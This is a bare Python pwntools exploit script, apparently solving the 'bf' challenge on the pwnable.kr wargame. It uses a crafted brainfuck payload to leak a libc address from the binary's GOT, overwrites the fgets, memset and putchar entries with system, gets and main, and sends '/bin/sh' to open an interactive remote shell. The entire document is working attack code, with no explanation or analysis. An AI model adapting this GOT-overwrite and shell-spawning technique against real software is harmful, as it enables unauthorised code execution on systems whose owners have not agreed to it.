from pwn import *
r = remote('pwnable.kr', 9001)
p = 0x804a0a0
p_fgets = 0x804a010
p_memset = 0x804a02c
p_putchar = 0x804a030
p_main = 0x8048671
def mvAddr(n):
    if n > 0:
        return ">"*n
    else:
        return "<"*((-1)*n)
def readVar():
    return ".>"*4 + "<"*4
def writeVar():
    return ",>"*4 + "<"*4

payload = mvAddr(p_fgets - p)
payload += readVar()
payload += writeVar()
payload += mvAddr(p_fgets - p_memset)
payload += writeVar()
payload += mvAddr(p_memset - p_putchar)
payload += writeVar()
payload += '.'

libc = ELF('./bf_libc.so')
fgets_addr_libc = libc.symbols['fgets']

r.recvline()
r.recvline()

r.send(payload+'\n')
fgets_addr_bin = u32(r.recv() + r.recv())
libc_base = int( fgets_addr_bin - fgets_addr_libc)
system = libc_base + libc.symbols['system']
gets = libc_base + libc.symbols['gets']

r.send(p32(system))
r.send(p32(gets))
r.send(p32(p_main))
r.send("/bin/sh" + '\n')

r.interactive() 
